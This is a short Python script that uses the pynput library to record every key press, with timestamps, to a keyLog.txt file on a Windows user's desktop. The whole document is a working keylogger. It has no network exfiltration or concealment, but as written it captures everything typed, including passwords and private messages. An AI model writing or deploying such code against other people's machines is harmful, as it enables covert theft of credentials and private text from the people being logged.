import pynput
from pynput.keyboard import Key, Listener
import logging

# set up the log directory and file
log_dir = r"C:/Users/ferna/Desktop"
logging.basicConfig(
    filename=(log_dir + r"/keyLog.txt"),
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# function to handle key presses
def on_press(key):
    logging.info(str(key))

# start the key listener
with Listener(on_press=on_press) as listener:
    listener.join()
